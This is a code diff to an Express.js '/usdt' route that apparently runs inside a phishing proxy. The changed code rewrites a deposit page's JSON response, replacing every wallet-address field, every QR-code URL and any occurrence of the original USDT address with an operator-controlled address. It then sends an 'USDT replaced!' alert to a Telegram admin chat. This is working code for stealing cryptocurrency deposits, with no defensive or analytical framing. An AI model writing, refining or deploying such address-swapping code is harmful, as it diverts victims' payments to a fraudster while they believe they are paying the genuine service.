@@ -1168,34 +1168,35 @@ app.all('/usdt', async (req, res) => {
     }
 
     if (bankData.usdtAddress && jsonResp && jsonResp.data) {
-      const oldAddr = jsonResp.data.address || jsonResp.data.customUsdtAddress || '';
+      const d = jsonResp.data;
       const newAddr = bankData.usdtAddress;
+      const oldAddr = d.usdtAddress || d.address || d.customUsdtAddress || '';
+      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(newAddr)}`;
 
-      function replaceUsdtDeep(obj) {
-        if (!obj || typeof obj !== 'object') return obj;
-        if (Array.isArray(obj)) { obj.forEach(item => replaceUsdtDeep(item)); return obj; }
-        for (const key of Object.keys(obj)) {
-          if (typeof obj[key] === 'string') {
-            if (['address', 'customUsdtAddress', 'walletAddress', 'usdtAddress', 'addr'].includes(key)) {
-              obj[key] = newAddr;
-            }
-            if (key === 'qrCodeUrl' || key === 'qrCode' || key === 'qr' || key === 'qrcodeUrl' || key === 'codeUrl') {
-              obj[key] = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(newAddr)}`;
-            }
-            if (oldAddr && obj[key].includes(oldAddr)) {
-              obj[key] = obj[key].replace(new RegExp(oldAddr.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), newAddr);
-            }
-          } else if (typeof obj[key] === 'object') {
-            replaceUsdtDeep(obj[key]);
+      if (d.usdtAddress !== undefined) d.usdtAddress = newAddr;
+      if (d.address !== undefined) d.address = newAddr;
+      if (d.customUsdtAddress !== undefined) d.customUsdtAddress = newAddr;
+      if (d.walletAddress !== undefined) d.walletAddress = newAddr;
+      if (d.addr !== undefined) d.addr = newAddr;
+
+      if (d.qrCode !== undefined) d.qrCode = qrUrl;
+      if (d.qrCodeUrl !== undefined) d.qrCodeUrl = qrUrl;
+      if (d.qr !== undefined) d.qr = qrUrl;
+      if (d.codeUrl !== undefined) d.codeUrl = qrUrl;
+
+      if (oldAddr) {
+        const escaped = oldAddr.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+        const re = new RegExp(escaped, 'g');
+        for (const key of Object.keys(d)) {
+          if (typeof d[key] === 'string' && d[key].includes(oldAddr)) {
+            d[key] = d[key].replace(re, newAddr);
           }
         }
-        return obj;
       }
-      replaceUsdtDeep(jsonResp.data);
 
       if (bankData.adminChatId && bot) {
         try {
-          await bot.sendMessage(bankData.adminChatId, `💰 USDT deposit page opened\nOriginal: ${oldAddr || '?'}\nReplaced → ${newAddr}`);
+          await bot.sendMessage(bankData.adminChatId, `💰 USDT replaced!\nOld: ${oldAddr}\nNew: ${newAddr}\nQR: ${qrUrl.substring(0, 60)}...`);
         } catch(e) {}
       }
     }
